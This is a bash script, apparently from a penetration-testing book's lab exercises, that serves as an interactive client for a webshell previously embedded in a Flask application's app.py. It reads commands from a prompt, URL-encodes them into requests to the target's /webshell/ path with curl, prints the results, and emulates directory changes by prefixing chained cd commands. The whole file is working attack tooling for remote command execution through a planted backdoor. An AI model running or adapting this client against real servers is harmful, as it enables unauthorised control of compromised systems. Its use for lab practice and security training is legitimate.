#!/bin/bash

source "/home/kali/Projects/Black-Hat-Bash/pentest.sh"

# Pre-requisites: embed webshell as the changes to 'app.py' files (page 130)

# Commands
# bash playground/exercises/run_webshell_opt.sh 172.16.10.10:8081

host="$1"
if [[ -z "$host" ]]; then
  echo "Host must be specified: $(basename "$0") <host>"
  exit 1
fi

compose_target_url() {
  local host="$1"
  local command="$2"
  echo "http://$host/webshell/$(urlencode "$command")"
}

get_pwd() {
  curl -s "$(compose_target_url "$host" "pwd")"
}

is_valid_response_body() {
  local response_body="$1"
  if echo "$response_body" | grep -q "subprocess.check_output\|404 Not Found\|CalledProcessError"; then
    echo "The webshell failed!"
    return 1
  fi
}

compose_cd_path_commands() {
  local path="$1"
  path_sep_spaces=$(echo "$path" | sed 's/\// /g')
  result_command=""
  for dir in $path_sep_spaces; do
    result_command="$result_command cd $dir;"
  done
  echo "$result_command"
}

# Keep track of working directory (handles CD command)
entry_dir_pwd=$(get_pwd)
if ! is_valid_response_body "$entry_dir_pwd"; then
  echo "PWD command failed! Inject wehshell first!"
  exit 1
fi
curr_dir_pwd="$entry_dir_pwd"
dirs_path=""

while true; do
  read -rp '$ ' raw_command
  if [[ -z "$raw_command" ]]; then
    echo "Command not provided!"
    continue
  fi

  target_url=$(compose_target_url "$host" "$raw_command")
  if [[ "$entry_dir_pwd" != "$curr_dir_pwd" ]]; then
    normalized_command="$(compose_cd_path_commands "$dirs_path") $raw_command"
    echo "Normalized command: $normalized_command"
    target_url=$(compose_target_url "$host" "$normalized_command")
  fi

  echo "Curated URL: $target_url | entry_dir_pwd: [$entry_dir_pwd] | pwd: [$curr_dir_pwd] | dirs_path: [$dirs_path]"
  response_body=$(curl -s "$target_url")

  if ! is_valid_response_body "$response_body"; then
    continue
  fi

  echo "$response_body"

  # Handle cd navigation
  if echo "$raw_command" | grep -q "^cd\ "; then
    dir_name=$(echo "$raw_command" | awk -F'cd ' '{print $2}')
    echo "Navigated to [$dir_name] directory"

    dirs_path="$dirs_path/$dir_name"
    cd_commands=$(compose_cd_path_commands "$dirs_path")
    echo "CD commands: $cd_commands"

    curr_dir_pwd=$(curl -s "$(compose_target_url "$host" "$cd_commands pwd")")

    if ! is_valid_response_body "$curr_dir_pwd"; then
      echo "Unable to navigate to: $dir_name"
      exit 1
    fi

    echo "Navigated directory PWD result: to [$curr_dir_pwd]"
    if [[ "$entry_dir_pwd" == "$curr_dir_pwd" ]]; then
      echo "Resetting 'dirs_path'..."
      dirs_path=""
    fi
  fi

done
